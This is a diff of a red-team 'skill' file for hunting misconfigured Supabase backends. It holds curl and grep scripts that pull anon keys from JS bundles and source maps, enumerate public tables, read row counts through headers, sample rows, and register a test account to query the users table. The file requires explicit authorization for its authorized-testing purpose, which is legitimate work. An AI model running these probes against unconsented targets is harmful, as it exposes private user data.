@@ -4,11 +4,52 @@ description: "Hunt Supabase exploitation — Supabase anon key discovery in JS b
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [supabase, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [supabase, hunt, redteam]
+  category: redteam
 ---
 
 # HUNT-SUPABASE — Supabase Exploitation
+
+## When to Use
+
+- A JS bundle, .env.
+- APK reveals a Supabase URL (project.supabase.co) and anon key (eyJ...).
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `python3`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Set once per engagement; every step below uses these.
+TARGET="example.com"   # or the engagement target
+export OUTPUT_DIR="${OUTPUT_DIR:-./output}"
+
+# Download JS bundles and search for Supabase
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET" | grep -Eo 'src="[^"]*\.js"' | cut -d'"' -f2 | while read js; do
+  curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET$js" -o "/tmp/$(basename $js)"
+done
+
+# Search for Supabase URL pattern
+grep -rEn 'https://[a-z0-9-]+\.supabase\.co' /tmp/*.js
+grep -rEn 'supabaseUrl|SUPABASE_URL|supabaseKey|SUPABASE_ANON_KEY' /tmp/*.js
+
+# Search for Supabase JWT anon key
+grep -rEn 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[^[:space:]]+' /tmp/*.js
+
+# Quick one-liner
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET" | grep -Eo 'https://[a-z0-9-]+\.supabase\.co'
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -44,7 +85,7 @@ grep -rEn 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[^[:space:]]+' /tmp/*.js
 
 # Quick one-liner
 curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET" | grep -Eo 'https://[a-z0-9-]+\.supabase\.co'
-curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET" | grep -Eo '(?:supabaseUrl|SUPABASE_URL)[": ]+[^"'\''\s]+'
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET" | grep -Po '(?:supabaseUrl|SUPABASE_URL)[": ]+[^"'\''\s]+'
 ```
 
 ### 1.2 Search in .env and Config Files
@@ -60,7 +101,7 @@ curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/manifest.json" | py
 ### 1.3 Extract from Source Maps
 ```bash
 # Check source maps for Supabase config
-curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET" | grep -Eo 'sourceMappingURL=[^\s"]+' | cut -d= -f2 | while read sm; do
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET" | grep -Po 'sourceMappingURL=[^\s"]+' | cut -d= -f2 | while read sm; do
   curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET$(echo $sm | sed 's|^/||')" -o "/tmp/$(basename $sm)"
 done
 
@@ -103,7 +144,12 @@ for table in users profiles user_profiles customers orders products messages pos
   response=$(curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" "$SUPABASE_URL/rest/v1/$table?limit=1" \
     -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY")
   if [ "$response" = "200" ]; then
-    echo "[+] PUBLIC TABLE: $table"
+    # Row count without fetching rows: HEAD + Prefer: count=exact leaks the
+    # total via the Content-Range header even when row reads are limited
+    count=$(curl --max-time 30 --connect-timeout 10 -sk "$SUPABASE_URL/rest/v1/$table?limit=0" \
+      -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
+      -H "Prefer: count=exact" -I 2>/dev/null | grep -i "content-range" | grep -Po '\d+(?=/\d+$)')
+    echo "[+] PUBLIC TABLE: $table (${count:-?} rows)"
     # Sample the data
     curl --max-time 30 --connect-timeout 10 -sk "$SUPABASE_URL/rest/v1/$table?limit=2" \
       -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" | python3 -m json.tool | head -20
@@ -250,7 +296,7 @@ SIGNUP=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "$SUPABASE_URL/auth
   -H "Content-Type: application/json" \
   -d '{"email":"test@test.com","password":"TestPassword123!"}')
 
-ACCESS_TOKEN=*** "$SIGNUP" | python3 -c "import sys, json; print(json.load(sys.stdin).get('access_token', 'NONE'))")
+ACCESS_TOKEN=$(echo "$SIGNUP" | python3 -c "import sys, json; print(json.load(sys.stdin).get('access_token', 'NONE'))")
 
 # Use this JWT for authenticated API calls
 curl --max-time 30 --connect-timeout 10 -sk "$SUPABASE_URL/rest/v1/users?select=*" \
@@ -358,35 +404,19 @@ Data leakage
 
 ---
 
-## Verification
-
-Run this self-test to confirm supabase hunting readiness:
-
-1. **Skill integrity** — confirm the skill file is readable and well-formed:
-   ```bash
-   grep -q "name: hunt-supabase" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
-   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
-   ```
-
-2. **Category check** — confirm the skill has a category:
-   ```bash
-   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
-   ```
-
-3. **Pitfalls section** — confirm pitfalls are documented:
-   ```bash
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-
-All 3 tests verify the skill is properly structured and ready for use.
-
----
-
 ## Pitfalls
 - **Supabase anon key exposure** — the anon key is intentionally public. It grants RLS-restricted access. The finding is when RLS policies are missing.
 - **Public bucket with RLS bypass** — if RLS policies allow public read on storage, that's intentional. Need access to data that should be private.
 - **Supabase URL + anon key as credential** — these are configuration values, not secrets. Rate impact based on what the anon key can access via missing RLS.
 - **Supabase realtime subscription without sensitive data** — subscribing to public channels is expected. Need subscription to private channels.
+
+---
+
+## Verification
+
+- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
+- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
+- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
 
 ---
 
